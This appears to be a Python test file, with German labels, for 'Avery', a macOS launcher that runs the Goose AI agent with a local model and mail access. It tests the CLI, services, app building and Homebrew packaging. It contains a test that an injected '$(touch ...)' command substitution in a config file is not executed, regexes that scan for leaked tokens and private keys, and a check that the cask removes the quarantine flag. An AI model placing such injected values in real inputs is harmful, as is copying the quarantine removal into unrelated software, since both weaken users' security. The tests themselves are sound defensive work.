proc, _ = avery("model", env={"AVERY_DRY_RUN": "1", "AVERY_MAX_CONTEXT": "16K"}, home=home4)
check("J19 avery.env: bekannte Werte gelten, die Umgebung hat Vorrang",
      "--max-memory 20G" in proc.stdout and "--max-context 16K" in proc.stdout, proc.stdout)
check("J20 avery.env wird gelesen, nicht ausgefuehrt", not os.path.exists(pwned) and "$(touch" in proc.stdout, proc.stdout)

proc, home5 = avery("app", env={"AVERY_DRY_RUN": "1"})
check("J21 app startet Goose mit dem Avery-Profil",
      proc.stdout.strip() == "open -n -a /Applications/Goose.app --env GOOSE_PATH_ROOT=%s/.avery/goose "
      "--env GOOSE_MOIM_MESSAGE_FILE=%s/.avery/goose/top-of-mind.md" % (home5, home5), proc.stdout)
proc, _ = avery("app", env={"AVERY_DRY_RUN": "1", "AVERY_GOOSE_APP": "/Opt/Mein Goose.app"})
check("J22 AVERY_GOOSE_APP wird beachtet", "-a /Opt/Mein Goose.app --env" in proc.stdout, proc.stdout)
proc, _ = avery("cli", "session", env={"AVERY_DRY_RUN": "1"})
check("J23 cli ruft die Goose-CLI der App auf", proc.stdout.strip().endswith("/Contents/Resources/bin/goose session"), proc.stdout)
proc, _ = avery("doctor")
check("J24 doctor laeuft durch und zeigt Version, Profil und Konten",
      proc.returncode in (0, 1) and "Avery %s" % mm.VERSION in proc.stdout and "Lesen freigegeben fuer: kein Konto" in proc.stdout
      and ("Alles bereit." in proc.stdout or "Punkt(e) offen." in proc.stdout), proc.stdout + proc.stderr)

linkdir = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(linkdir)
os.symlink(AVERY, os.path.join(linkdir, "avery"))
proc, _ = avery("version", script=os.path.join(linkdir, "avery"))
check("J25 Aufruf ueber Symlink (wie in Homebrew) findet libexec und share", proc.stdout.strip() == "avery " + mm.VERSION, proc.stderr)

cellar_root = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(cellar_root)
prefix = os.path.join(cellar_root, "Cellar", "avery", mm.VERSION)
for part in ("bin", "libexec", "share"):
    shutil.copytree(os.path.join(ROOT, part), os.path.join(prefix, part), ignore=shutil.ignore_patterns("__pycache__"))
os.makedirs(os.path.join(cellar_root, "bin"))
os.symlink(os.path.join(prefix, "bin", "avery"), os.path.join(cellar_root, "bin", "avery"))
os.symlink(os.path.join(prefix, "libexec", "avery-mail"), os.path.join(cellar_root, "bin", "avery-mail"))
proc, home6 = avery("init", script=os.path.join(cellar_root, "bin", "avery"),
                    env={"PATH": os.path.join(cellar_root, "bin") + ":" + os.environ.get("PATH", "")})
cfg6 = open(os.path.join(home6, ".avery", "goose", "config", "config.yaml"), encoding="utf-8").read()
check("J26 Homebrew-Layout: die Konfiguration nutzt den stabilen Symlink statt des Cellar-Pfads",
      'cmd: "%s"' % os.path.join(cellar_root, "bin", "avery-mail") in cfg6 and "/Cellar/" not in cfg6, cfg6[-400:])

# ------------------------------------------------------------------ K: status
account = {"id": "ACC-1", "name": "Privat Gmail", "type": "imap", "addresses": ["me@gmail.example"]}
proc, _ = cli({"version": 2, "allowed_accounts": [account], "write": {"accounts": ["ACC-1"]}}, "", "status")
check("K1 status zeigt freigegebene Konten und Schreibrechte",
      proc.returncode == 0 and "Lesen freigegeben fuer: Privat Gmail" in proc.stdout
      and "Entwuerfe/Senden: Privat Gmail" in proc.stdout, proc.stdout)
proc, _ = cli({"version": 2, "allowed_accounts": [account]}, "", "status")
check("K2 status ohne write: aus", "Entwuerfe/Senden: aus" in proc.stdout, proc.stdout)
proc, _ = cli(None, "", "status")
check("K3 status ohne Konfiguration: fehlt, kein Konto", "(fehlt)" in proc.stdout and "kein Konto" in proc.stdout, proc.stdout)

# ------------------------------------------- L: nothing personal or secret in the repository
EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})")
FORBIDDEN = [re.compile(x) for x in ("/Users/", "gh" + "o_[A-Za-z0-9]{20}", "gh" + "p_[A-Za-z0-9]{20}", "github" + "_pat_",
                                     "-----BEGIN [A-Z ]*PRIVATE KEY", "aiello" + r"\.ch", "@micro" + "soft.com")]
problems = []
for base, dirs, names in os.walk(ROOT):
    dirs[:] = [d for d in dirs if d not in (".git", "__pycache__")]
    for name in names:
        full = os.path.join(base, name)
        if full == os.path.abspath(__file__):
            continue
        try:
            text = open(full, encoding="utf-8").read()
        except (UnicodeDecodeError, OSError):
            continue
        for pattern in FORBIDDEN:
            if pattern.search(text):
                problems.append("%s: %s" % (os.path.relpath(full, ROOT), pattern.pattern))
        for match in EMAIL.finditer(text):
            domain = match.group(1).lower()
            if re.fullmatch(r"[0-9]x\.(png|tiff?)", domain):
                continue  # icon_16x16@2x.png
            if not (domain.endswith(".example") or domain in ("example.org", "example.com", "example.invalid", "github.com")):
                problems.append("%s: %s" % (os.path.relpath(full, ROOT), match.group(0)))
check("L1 keine persoenlichen Adressen, Pfade oder Zugangsdaten im Projekt", not problems, problems[:5])

# ------------------------------------------------ N: service commands and YAML check
import http.server
import threading


class _Health(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass


health_server = http.server.HTTPServer(("127.0.0.1", 0), _Health)
threading.Thread(target=health_server.serve_forever, daemon=True).start()
alive_url = "http://127.0.0.1:%d/health" % health_server.server_address[1]
dead_url = "http://127.0.0.1:9/health"

proc, _ = avery("up", env={"AVERY_DRY_RUN": "1", "AVERY_MODEL_URL": dead_url})
lines = proc.stdout.strip().splitlines()
check("N1 up (Modell aus): startet erst den Dienst, dann Goose",
      any(line.endswith("services run avery") for line in lines) and lines[-1].startswith("open -n -a"), proc.stdout)
proc, _ = avery("up", env={"AVERY_DRY_RUN": "1", "AVERY_MODEL_URL": alive_url})
check("N2 up (Modell laeuft): kein zweiter Start, nur Goose",
      "laeuft bereits" in proc.stdout and "services run" not in proc.stdout and "open -n -a" in proc.stdout, proc.stdout)
proc, _ = avery("down", env={"AVERY_DRY_RUN": "1"})
check("N3 down beendet den Dienst", "services stop avery" in proc.stdout and "Cmd+Q" in proc.stdout, proc.stdout)
proc, _ = avery("doctor", env={"AVERY_MODEL_URL": alive_url})
check("N4 doctor: Modell erreichbar", "ok      Modellserver laeuft" in proc.stdout, proc.stdout)
proc, _ = avery("help")
check("N5 help nennt up und down", "avery up" in proc.stdout and "avery down" in proc.stdout)

empty_cache = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(empty_cache)
proc, _ = avery("up", env={"AVERY_MODEL_URL": dead_url, "HF_HOME": empty_cache})
check("N5b up ohne geladenes Modell: sofortiger Hinweis auf 'avery pull', kein Dienststart",
      proc.returncode == 1 and "avery pull" in proc.stderr and "services run" not in proc.stdout, proc.stdout + proc.stderr)
full_cache = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(full_cache)
os.makedirs(os.path.join(full_cache, "hub", "models--unsloth--Qwen3.8-27B-GGUF", "snapshots"))
proc, _ = avery("doctor", env={"AVERY_MODEL_URL": dead_url, "HF_HOME": full_cache})
check("N5c doctor: Modell im Cache erkannt", "ok      Modell im Cache" in proc.stdout, proc.stdout)
proc, _ = avery("doctor", env={"AVERY_MODEL_URL": dead_url, "HF_HOME": empty_cache})
check("N5d doctor: fehlendes Modell mit Hinweis auf pull", "Modell nicht im Cache -> avery pull" in proc.stdout, proc.stdout)
os.makedirs(os.path.join(full_cache, "hub", "models--foo--bar", "snapshots"))
proc, _ = avery("doctor", env={"AVERY_MODEL_URL": dead_url, "HF_HOME": full_cache, "AVERY_MODEL": "foo/bar:Q4"})
check("N5e Cache-Pruefung folgt AVERY_MODEL", "ok      Modell im Cache" in proc.stdout, proc.stdout)

if shutil.which("ruby"):
    proc, home_y = avery("init")
    proc, _ = avery("doctor", home=home_y, env={"AVERY_MODEL_URL": alive_url})
    check("N6 doctor: gueltiges YAML wird bestaetigt", "YAML gueltig: config.yaml" in proc.stdout and "UNGUELTIG" not in proc.stdout, proc.stdout)
    broken_path = os.path.join(home_y, ".avery", "goose", "config", "config.yaml")
    original = open(broken_path, encoding="utf-8").read()
    broken = original.replace("description: Private Mail (Apple Mail; lesen", "description: Private Mail (Apple Mail: lesen", 1)
    check("N7 (Testaufbau) der Fehler vom 12.11. laesst sich nachstellen", broken != original)
    open(broken_path, "w", encoding="utf-8").write(broken)
    proc, _ = avery("doctor", home=home_y, env={"AVERY_MODEL_URL": alive_url})
    check("N8 doctor erkennt ungueltiges YAML und meldet es", proc.returncode == 1 and "YAML UNGUELTIG" in proc.stdout, proc.stdout)

formula_text = open(os.path.join(ROOT, "Formula", "avery.rb"), encoding="utf-8").read()
check("N9 Formel definiert den Modell-Dienst",
      "service do" in formula_text and 'run [opt_bin/"avery", "model"]' in formula_text
      and "keep_alive crashed: true" in formula_text and "std_service_path_env" in formula_text)

# ------------------------------------------------ P: the Avery app (one icon, own icon)
import filecmp
import plistlib

app_root = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(app_root)
stub = os.path.join(app_root, "fake-avery")
stub_log = os.path.join(app_root, "calls.log")
with open(stub, "w") as handle:
    handle.write('#!/bin/sh\necho "$@" >> "%s"\necho "Modell bereit"\nexit 0\n' % stub_log)
os.chmod(stub, 0o755)
apps = os.path.join(app_root, "Applications")
os.makedirs(os.path.join(apps, "Avery beenden.app"))  # left over from 0.2.x
proc, _ = avery("install-app", env={"AVERY_APP_DIR": apps, "AVERY_APP_COMMAND": stub})
start_app = os.path.join(apps, "Avery.app")
check("P1 genau eine App; die alte 'Avery beenden.app' ist entfernt",
      proc.returncode == 0 and os.listdir(apps) == ["Avery.app"] and "entfernt" in proc.stdout, proc.stdout + proc.stderr)
source = subprocess.run(["osadecompile", start_app], capture_output=True, text=True).stdout
check("P2 die App ruft 'avery up' auf und zeigt Fehler in einem Dialog",
      'set cliPath to "%s"' % stub in source and 'quoted form of cliPath & " up 2>&1"' in source
      and "display dialog" in source and " down" not in source, source)
check("P2b fehlt die Kommandozeile, erklaert die App, was zu installieren ist",
      'do shell script "test -x " & quoted form of cliPath' in source and "brew install flavioaiello/avery/avery" in source, source)
info = plistlib.load(open(os.path.join(start_app, "Contents", "Info.plist"), "rb"))
check("P3 Name, Kennung und Version sind gesetzt",
      info.get("CFBundleName") == "Avery" and info.get("CFBundleDisplayName") == "Avery"
      and info.get("CFBundleIdentifier") == "io.github.flavioaiello.avery"
      and info.get("CFBundleShortVersionString") == mm.VERSION, info)
check("P4 eigenes Icon ist eingebaut",
      filecmp.cmp(os.path.join(ROOT, "share", "avery", "Avery.icns"),
                  os.path.join(start_app, "Contents", "Resources", "applet.icns"), shallow=False))
check("P5 die Signatur der App ist gueltig",
      subprocess.run(["codesign", "--verify", "--deep", "--strict", start_app], capture_output=True).returncode == 0)
run = subprocess.run(["osascript", os.path.join(start_app, "Contents", "Resources", "Scripts", "main.scpt")],
                     capture_output=True, text=True, timeout=60)
calls = open(stub_log).read().split("\n") if os.path.exists(stub_log) else []
check("P6 die App fuehrt den Befehl aus (im Erfolgsfall ohne Dialog)", run.returncode == 0 and calls[0] == "up", (run.stdout, run.stderr, calls))
proc, _ = avery("install-app", env={"AVERY_APP_DIR": apps, "AVERY_APP_COMMAND": stub})
check("P7 install-app ist wiederholbar", proc.returncode == 0 and os.listdir(apps) == ["Avery.app"] and "entfernt" not in proc.stdout, proc.stdout)
proc, _ = avery("install-app", env={"AVERY_APP_DIR": app_root + "/x", "AVERY_APP_COMMAND": '/tmp/a"b'})
check("P8 Pfad mit Anfuehrungszeichen wird abgelehnt", proc.returncode == 1 and "Anfuehrungszeichen" in proc.stderr, proc.stderr)
for bad_path, label in (("/x/avery\\", "ein einzelner Backslash"), ('/x/a"b', "ein Anfuehrungszeichen")):
    proc = subprocess.run([os.path.join(ROOT, "libexec", "avery-make-app"), "--output", app_root + "/y.app", "--command", bad_path],
                          capture_output=True, text=True)
    check("P8b avery-make-app lehnt %s im Pfad ab" % label, proc.returncode == 1 and "Anfuehrungszeichen oder Backslashes" in proc.stderr, proc.stderr)
keep = os.path.join(app_root, "keep.app")
os.makedirs(os.path.join(keep, "Contents"))
open(os.path.join(keep, "Contents", "marker"), "w").write("alt")
unreadable = os.path.join(app_root, "unreadable.icns")
open(unreadable, "w").write("x")
os.chmod(unreadable, 0)
proc = subprocess.run([os.path.join(ROOT, "libexec", "avery-make-app"), "--output", keep, "--icon", unreadable], capture_output=True, text=True)
check("P8c ein fehlgeschlagener Bau laesst eine vorhandene App unangetastet",
      proc.returncode != 0 and os.path.exists(os.path.join(keep, "Contents", "marker")), proc.stdout + proc.stderr)
os.chmod(unreadable, 0o600)
proc, _ = avery("help")
check("P9 help nennt install-app, nicht mehr 'beenden.app'", "avery install-app" in proc.stdout and "beenden.app" not in proc.stdout)

check("P10 kein Asset-Katalog und keine CFBundleIconName (sonst zeigt macOS das Skript-Icon statt Avery)",
      not os.path.exists(os.path.join(start_app, "Contents", "Resources", "Assets.car")) and "CFBundleIconName" not in info, sorted(info))
for version_string, expected_icon in (("26.0.1", "Avery.icns"), ("15.4", "AveryClassic.icns")):
    icon_apps = os.path.join(app_root, "icons-" + version_string)
    proc, _ = avery("install-app", env={"AVERY_APP_DIR": icon_apps, "AVERY_APP_COMMAND": stub, "AVERY_MACOS_VERSION": version_string})
    check("P11 macOS %s bekommt %s" % (version_string, expected_icon),
          proc.returncode == 0 and filecmp.cmp(os.path.join(ROOT, "share", "avery", expected_icon),
                                                os.path.join(icon_apps, "Avery.app", "Contents", "Resources", "applet.icns"), shallow=False),
          proc.stdout + proc.stderr)
check("P11b die beiden Icons unterscheiden sich",
      not filecmp.cmp(os.path.join(ROOT, "share", "avery", "Avery.icns"), os.path.join(ROOT, "share", "avery", "AveryClassic.icns"), shallow=False))

# With the cask installed, install-app must not create a second icon and removes a leftover copy.
cask_app = os.path.join(app_root, "Programme", "Avery.app")
os.makedirs(cask_app)
home_dup = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(home_dup)
os.makedirs(os.path.join(home_dup, "Applications", "Avery.app"))
proc, _ = avery("install-app", home=home_dup, env={"AVERY_SYSTEM_APP": cask_app})
check("P12 mit installiertem Cask legt install-app keine zweite App an und raeumt die Kopie ab",
      proc.returncode == 0 and "schon installiert" in proc.stdout and not os.path.exists(os.path.join(home_dup, "Applications", "Avery.app")),
      proc.stdout + proc.stderr)
same_home = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(same_home)
same_app = os.path.join(same_home, "Applications", "Avery.app")
os.makedirs(same_app)
proc, _ = avery("install-app", home=same_home, env={"AVERY_SYSTEM_APP": same_app})
check("P12b install-app loescht nie die App des Cask, auch wenn beide Pfade zusammenfallen",
      proc.returncode == 0 and os.path.isdir(same_app) and "entfernt" not in proc.stdout, proc.stdout + proc.stderr)
proc, _ = avery("doctor", env={"AVERY_SYSTEM_APP": cask_app})
check("P13 doctor findet die App im Programme-Ordner", "ok      Avery.app (%s)" % cask_app in proc.stdout, proc.stdout)
proc, _ = avery("doctor", env={"AVERY_SYSTEM_APP": os.path.join(app_root, "nirgends", "Avery.app")})
check("P14 fehlt die App, ist das nur ein Hinweis und zaehlt nicht als fehlend",
      "Hinweis Avery.app fehlt" in proc.stdout and "brew install --cask flavioaiello/avery/avery" in proc.stdout, proc.stdout)
builder = os.path.join(ROOT, "libexec", "avery-make-app")
for args, expected in (([], "--output fehlt"), (["--output", app_root + "/x"], "muss auf .app enden"),
                       (["--output", app_root + "/x.app", "--command", "relativ"], "absoluter Pfad"),
                       (["--output", app_root + "/x.app", "--icon", app_root + "/gibt-es-nicht.icns"], "Icon nicht gefunden"),
                       (["--bogus"], "unbekannte Option")):
    proc = subprocess.run([builder] + args, capture_output=True, text=True)
    check("P15 avery-make-app %s -> %s" % (" ".join(args[:2]) or "(ohne Argumente)", expected),
          proc.returncode == 1 and expected in proc.stderr, proc.stderr)

# ---------------------------------------- G: opening Goose with the right profile (fake Goose processes)
import signal


def fake_goose(app_path, root=None, seconds=120):
    args = ["python3", "-c", "import time; time.sleep(%d)" % seconds, os.path.join(app_path, "Contents", "MacOS", "Goose")]
    if root:
        args.append('{"GOOSE_PATH_ROOT":"%s"}' % root)
    process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.6)
    return process


def stop_process(process):
    process.kill()
    process.wait()


goose_root = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(goose_root)
fake_app = os.path.join(goose_root, "Fake.app")
os.makedirs(os.path.join(fake_app, "Contents", "MacOS"))
profile = os.path.join(goose_root, "profile")
os.makedirs(os.path.join(profile, "config"))
open(os.path.join(profile, "config", "config.yaml"), "w").write("x: 1\n")
stubs = os.path.join(goose_root, "stubs")
os.makedirs(stubs)
open_log = os.path.join(goose_root, "open.log")
with open(os.path.join(stubs, "open"), "w") as handle:
    handle.write('#!/bin/sh\necho "$@" >> "%s"\n' % open_log)
os.chmod(os.path.join(stubs, "open"), 0o755)
env_g = {"AVERY_GOOSE_APP": fake_app, "AVERY_GOOSE_ROOT": profile, "AVERY_MODEL_URL": dead_url,
         "PATH": stubs + ":" + os.environ.get("PATH", "")}


def open_calls():
    return open(open_log).read().strip() if os.path.exists(open_log) else ""


gp = fake_goose(fake_app, root=profile)
proc, _ = avery("app", env=env_g)
check("G1 Goose laeuft schon mit dem Avery-Profil: nur in den Vordergrund holen",
      proc.returncode == 0 and "laeuft bereits mit dem Avery-Profil" in proc.stdout and open_calls() == "-a %s" % fake_app,
      (proc.stdout, proc.stderr, open_calls()))
stop_process(gp)
os.remove(open_log)
gp = fake_goose(fake_app, root=os.path.join(goose_root, "anderes-profil"))
proc, _ = avery("app", env=env_g)
check("G2 Goose laeuft mit einem anderen Profil: klare Meldung, nichts gestartet",
      proc.returncode == 1 and "anderen Profil" in proc.stderr and open_calls() == "", (proc.stdout, proc.stderr, open_calls()))
stop_process(gp)
proc, _ = avery("app", env=env_g)
check("G3 Goose laeuft nicht: Start mit dem Avery-Profil",
      proc.returncode == 0 and open_calls() == "-n -a %s --env GOOSE_PATH_ROOT=%s --env GOOSE_MOIM_MESSAGE_FILE=%s/top-of-mind.md"
      % (fake_app, profile, profile), (proc.stdout, proc.stderr, open_calls()))

# ------------------------------------------------ W: the watcher stops the model after Goose was closed
def avery_popen(*args, env=None, home=None):
    environment = {k: v for k, v in os.environ.items() if not k.startswith(("MAIL_MCP_", "AVERY_"))}
    home = home or tempfile.mkdtemp(prefix="averytest-")
    TMPDIRS.append(home)
    environment["HOME"] = home
    environment.update(env or {})
    return subprocess.Popen([AVERY] + list(args), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=environment), home


env_w = {"AVERY_DRY_RUN": "1", "AVERY_WATCH_INTERVAL": "1", "AVERY_IDLE_SECONDS": "3", "AVERY_GOOSE_APP": fake_app,
         "AVERY_MODEL_URL": alive_url}
proc, home_w1 = avery("watch", env=env_w)
check("W1 ohne Goose: das Modell wird nach der Wartezeit gestoppt",
      proc.returncode == 0 and "services stop avery" in proc.stdout and "Modell wird gestoppt" in proc.stdout
      and not os.path.exists(os.path.join(home_w1, ".avery", "watch.pid")), proc.stdout + proc.stderr)
gp = fake_goose(fake_app)
watcher, home_w2 = avery_popen("watch", env=env_w)
time.sleep(5)
still_running = watcher.poll() is None
stop_process(gp)
output, _ = watcher.communicate(timeout=20)
check("W2 solange Goose laeuft, bleibt das Modell; nach dem Schliessen wird es gestoppt",
      still_running and "services stop avery" in output, (still_running, output))
proc, _ = avery("watch", env=dict(env_w, AVERY_MODEL_URL=dead_url))
check("W3 laeuft das Modell nicht mehr, endet der Waechter ohne Stopp-Befehl",
      proc.returncode == 0 and "laeuft nicht mehr" in proc.stdout and "services stop" not in proc.stdout, proc.stdout)
gp = fake_goose(fake_app)
watcher, home_w3 = avery_popen("watch", env=env_w)
time.sleep(2)
proc, _ = avery("watch", env=env_w, home=home_w3)
check("W4 es gibt nur einen Waechter", proc.returncode == 0 and "laeuft bereits" in proc.stdout, proc.stdout)
proc, _ = avery("down", env=env_w, home=home_w3)
try:
    watcher.wait(timeout=10)
    ended = True
except subprocess.TimeoutExpired:
    ended = False
    watcher.kill()
stop_process(gp)
check("W5 'avery down' beendet auch den Waechter und stoppt das Modell",
      ended and "services stop avery" in proc.stdout and not os.path.exists(os.path.join(home_w3, ".avery", "watch.pid")),
      (ended, proc.stdout))
proc, _ = avery("up", env={"AVERY_DRY_RUN": "1", "AVERY_MODEL_URL": dead_url})
check("W6 up startet den Waechter nur, wenn es das Modell selbst gestartet hat", "Waechter im Hintergrund" in proc.stdout, proc.stdout)
proc, _ = avery("up", env={"AVERY_DRY_RUN": "1", "AVERY_MODEL_URL": alive_url})
check("W7 ein schon laufendes Modell bleibt unter deiner Kontrolle (kein Waechter)", "Waechter" not in proc.stdout and "laeuft bereits" in proc.stdout, proc.stdout)

health_server.shutdown()

# ------------------------------------------- Q: logo, disk image and cask
icons = [os.path.join(ROOT, "share", "avery", name) for name in ("Avery.icns", "AveryClassic.icns")]
for icon_path in icons:
    out_dir = tempfile.mkdtemp(prefix="averytest-")
    TMPDIRS.append(out_dir)
    proc = subprocess.run(["iconutil", "-c", "iconset", icon_path, "-o", os.path.join(out_dir, "x.iconset")], capture_output=True, text=True)
    sizes = sorted(os.listdir(os.path.join(out_dir, "x.iconset"))) if proc.returncode == 0 else []
    check("Q1 %s ist ein gueltiges icns mit allen 10 Groessen" % os.path.basename(icon_path), len(sizes) == 10, proc.stderr or sizes)
for name in ("avery-icon.svg", "avery-app-icon.svg", "avery-mark.svg"):
    text = open(os.path.join(ROOT, "assets", name), encoding="utf-8").read()
    check("Q2 assets/%s ist ein SVG ohne eingebettete Bilder" % name, text.startswith("<svg") and "<image" not in text and "base64" not in text)
tiff_info = subprocess.run(["tiffutil", "-info", os.path.join(ROOT, "assets", "dmg", "background.tiff")], capture_output=True, text=True).stdout
check("Q3 das DMG-Hintergrundbild hat 1x und 2x (640x448 und 1280x896)",
      tiff_info.count("Directory at") == 2 and "Image Width: 640 Image Length: 448" in tiff_info and "Image Width: 1280 Image Length: 896" in tiff_info, tiff_info)
for script in ("tools/render-assets.sh", "tools/make-dmg.sh", "tools/verify-dmg.sh", "tools/publish-dmg.sh", "libexec/avery-make-app", "bin/avery"):
    full = os.path.join(ROOT, script)
    check("Q4 %s ist ausfuehrbar und hat gueltige Syntax" % script,
          os.access(full, os.X_OK) and subprocess.run(["bash", "-n", full], capture_output=True).returncode == 0)
make_dmg = open(os.path.join(ROOT, "tools", "make-dmg.sh"), encoding="utf-8").read()
verify_dmg = open(os.path.join(ROOT, "tools", "verify-dmg.sh"), encoding="utf-8").read()
geometry = re.search(r"win_left=(\d+) win_top=(\d+) win_width=(\d+) win_height=(\d+)\napp_x=(\d+) app_y=(\d+) apps_x=(\d+) apps_y=(\d+)", make_dmg)
expected_layout = "icon view|%d,%d,%d,%d|%s,%s|%s,%s|128|13|false" % (
    int(geometry.group(1)), int(geometry.group(2)), int(geometry.group(1)) + int(geometry.group(3)), int(geometry.group(2)) + int(geometry.group(4)),
    geometry.group(5), geometry.group(6), geometry.group(7), geometry.group(8)) if geometry else None
check("Q5 make-dmg.sh und verify-dmg.sh meinen dasselbe Fensterlayout", bool(geometry) and expected_layout in verify_dmg, expected_layout)
check("Q6 das Fenster passt zum Hintergrundbild (640 x 448)", bool(geometry) and geometry.group(3) == "640" and geometry.group(4) == "448")
check("Q7 das Volume-Icon kommt erst nach Finders Update ins Image (Finder loescht es sonst)",
      make_dmg.index("update without registering applications") < make_dmg.index(".VolumeIcon.icns"))

cask_text = open(os.path.join(ROOT, "Casks", "avery.rb"), encoding="utf-8").read()
check("Q8 Cask: App aus dem verschachtelten DMG, Abhaengigkeit von der Formel, Tahoe",
      'app "Avery.app"' in cask_text and 'container nested: "Avery-#{version}.dmg"' in cask_text
      and 'depends_on formula: "flavioaiello/avery/avery"' in cask_text and "depends_on macos: :tahoe" in cask_text, cask_text)
cask_url = re.search(r'url "([^"]+)"', cask_text)
check("Q9 Cask: Image per git ueber SSH, Tag dmg-v<Version> und feste Revision",
      bool(cask_url) and cask_url.group(1) == "ssh://git@github.com/flavioaiello/avery.git" and "using:    :git" in cask_text
      and 'tag:      "dmg-v#{version}"' in cask_text and re.search(r'revision: "[0-9a-f]{40}"', cask_text) is not None)
if shutil.which("ruby") and cask_url:
    check("Q9b die Cask-URL ist ein gueltiger URI (die scp-Form git@host:pfad ist es nicht und laesst den Cask nicht laden)",
          subprocess.run(["ruby", "-ruri", "-e", "URI(ARGV[0])", cask_url.group(1)], capture_output=True).returncode == 0)
check("Q10 Cask: Quarantaene wird entfernt (Ad-hoc-Signatur, nicht notarisiert), mit den aktuellen Schritten statt dem veralteten postflight",
      "postflight_steps do" in cask_text and "postflight do" not in cask_text
      and 'run "/usr/bin/xattr", args: ["-dr", "com.apple.quarantine", "{{appdir}}/Avery.app"]' in cask_text)
brew_path = shutil.which("brew") or ("/opt/homebrew/bin/brew" if os.path.exists("/opt/homebrew/bin/brew") else None)
if brew_path:
    brew_env = dict(os.environ, HOMEBREW_DEVELOPER="1", HOMEBREW_NO_AUTO_UPDATE="1", HOMEBREW_NO_ANALYTICS="1", HOMEBREW_NO_ENV_HINTS="1")
    loader = ('c = Cask::CaskLoader::FromContentLoader.new(File.read(ARGV[0]), tap: Tap.fetch("flavioaiello/avery")).load(config: nil); '
              'puts "geladen #{c.token} #{c.version}"')
    proc = subprocess.run([brew_path, "ruby", "-e", loader, os.path.join(ROOT, "Casks", "avery.rb")],
                          capture_output=True, text=True, env=brew_env, timeout=120)
    check("Q11a Homebrew laedt den Cask im strengen Entwicklermodus ohne Fehler und ohne Veraltet-Warnungen",
          "geladen avery " + mm.VERSION in proc.stdout and "deprecated" not in (proc.stdout + proc.stderr).lower(), proc.stdout + proc.stderr)
if shutil.which("ruby"):
    for rb in ("Casks/avery.rb", "Formula/avery.rb"):
        check("Q11 %s hat gueltige Ruby-Syntax" % rb, subprocess.run(["ruby", "-c", os.path.join(ROOT, rb)], capture_output=True).returncode == 0)

# publish-dmg.sh against a throw-away project and a bare "origin"
if shutil.which("git") and shutil.which("ruby"):
    pub = tempfile.mkdtemp(prefix="averytest-")
    TMPDIRS.append(pub)
    project, remote = os.path.join(pub, "project"), os.path.join(pub, "origin.git")
    for sub in ("bin", "tools", "Casks", "dist"):
        os.makedirs(os.path.join(project, sub))
    shutil.copy(os.path.join(ROOT, "tools", "publish-dmg.sh"), os.path.join(project, "tools"))
    shutil.copy(os.path.join(ROOT, "Casks", "avery.rb"), os.path.join(project, "Casks"))
    open(os.path.join(project, "bin", "avery"), "w").write('AVERY_VERSION="9.9.9"\n')
    image = os.path.join(project, "dist", "Avery-9.9.9.dmg")
    open(image, "wb").write(b"disk image one")
    git_env = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@example.org", GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@example.org")
    run_git = lambda *a, cwd=project: subprocess.run(["git"] + list(a), cwd=cwd, capture_output=True, text=True, env=git_env)
    run_git("init", "-q", "--bare", remote, cwd=pub)
    run_git("init", "-q", ".")
    run_git("remote", "add", "origin", remote)
    publish = os.path.join(project, "tools", "publish-dmg.sh")
    first = subprocess.run([publish], capture_output=True, text=True, env=git_env)
    revision = run_git("rev-parse", "dmg-v9.9.9^{commit}").stdout.strip()
    files = run_git("ls-tree", "-r", "--name-only", revision).stdout.split()
    parents = run_git("rev-list", "--parents", "-n", "1", revision).stdout.split()
    pinned = open(os.path.join(project, "Casks", "avery.rb")).read()
    check("Q12 publish-dmg: ein Tag mit genau einem Commit, der nur das Image enthaelt (ohne Elternteil)",
          first.returncode == 0 and files == ["Avery-9.9.9.dmg"] and parents == [revision], first.stdout + first.stderr)
    check("Q13 publish-dmg: Tag liegt auf dem Server, Cask nennt Version und Revision",
          run_git("--git-dir", remote, "rev-parse", "dmg-v9.9.9^{commit}").stdout.strip() == revision
          and 'version "9.9.9"' in pinned and 'revision: "%s"' % revision in pinned, pinned)
    again = subprocess.run([publish], capture_output=True, text=True, env=git_env)
    check("Q14 publish-dmg ist wiederholbar, solange das Image gleich ist", again.returncode == 0 and "existiert schon" in again.stdout, again.stdout + again.stderr)
    open(image, "wb").write(b"disk image two")
    changed = subprocess.run([publish], capture_output=True, text=True, env=git_env)
    check("Q15 publish-dmg verschiebt kein veroeffentlichtes Tag", changed.returncode == 1 and "nicht verschoben" in changed.stderr, changed.stderr)
    run_git("--git-dir", remote, "tag", "-d", "dmg-v9.9.9")
    redo = subprocess.run([publish], capture_output=True, text=True, env=git_env)
    new_revision = run_git("rev-parse", "dmg-v9.9.9^{commit}").stdout.strip()
    check("Q16 ein Tag, das nie auf dem Server ankam, darf mit neuem Image wiederholt werden",
          redo.returncode == 0 and new_revision != revision
          and run_git("--git-dir", remote, "rev-parse", "dmg-v9.9.9^{commit}").stdout.strip() == new_revision, redo.stdout + redo.stderr)

# --------------------------------------------------------------- M: versions agree
version_in_cli = re.search(r'^AVERY_VERSION="([0-9.]+)"', open(AVERY, encoding="utf-8").read(), re.M).group(1)
check("M1 Versionen in bin/avery und libexec/avery-mail stimmen ueberein", version_in_cli == mm.VERSION, (version_in_cli, mm.VERSION))
formula = os.path.join(ROOT, "Formula", "avery.rb")
if os.path.exists(formula):
    tag = re.search(r'tag:\s+"v([0-9.]+)"', open(formula, encoding="utf-8").read())
    check("M2 Formel verweist auf das Tag dieser Version", bool(tag) and tag.group(1) == mm.VERSION, tag and tag.group(1))

cask_version = re.search(r'^  version "([0-9.]+)"', cask_text, re.M)
